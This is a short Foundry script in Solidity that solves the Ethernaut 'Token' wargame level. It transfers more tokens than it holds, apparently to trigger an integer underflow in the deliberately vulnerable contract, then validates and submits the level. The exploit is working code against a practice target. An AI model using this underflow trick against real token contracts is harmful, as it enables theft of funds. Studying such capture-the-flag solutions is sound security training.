// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Token.sol";

contract TokenSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Token instance = Token(getLevelInstance(Levels.token));

        instance.transfer(address(1), 21);

        require(validateLevelInstance(Levels.token, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
